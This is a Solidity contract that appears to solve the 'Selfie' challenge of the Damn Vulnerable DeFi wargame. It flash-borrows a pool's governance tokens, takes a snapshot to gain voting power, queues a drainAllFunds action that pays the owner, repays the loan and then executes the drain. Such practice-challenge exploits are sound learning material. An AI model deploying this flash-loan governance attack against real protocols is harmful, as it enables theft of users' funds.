// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttack {

    using Address for address;

    address owner;
    uint256 public attackActionId;

    SelfiePool selfiePool;
    SimpleGovernance govProtocol;
    DamnValuableTokenSnapshot govToken;

    constructor(
        address _selfiePoolAddress,
        address _simpleGovernanceAddress,
        address _damnValuableTokenSnapshotAddress

    ) {
        owner = msg.sender;
        selfiePool = SelfiePool(_selfiePoolAddress);
        govProtocol = SimpleGovernance(_simpleGovernanceAddress);
        govToken = DamnValuableTokenSnapshot(_damnValuableTokenSnapshotAddress);

    }

    function requestFlashLoan() external {
        require(msg.sender == owner, "Only owner allowed");

        uint256 poolBalance = govToken.balanceOf(address(selfiePool));

        selfiePool.flashLoan(poolBalance);
    }

    function receiveTokens(address borrowTokenAddress, uint256 amount) external {
        require(msg.sender == address(selfiePool), "Only selfie pool allowed");

        govToken.snapshot();

        attackActionId = govProtocol.queueAction(
            address(selfiePool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );

        require(govToken.transfer(address(selfiePool), amount), "Return payment failed");
    }

    function executeAttackAction() external {
        require(msg.sender == owner, "Only owner allowed");
        govProtocol.executeAction(attackActionId);
    }

}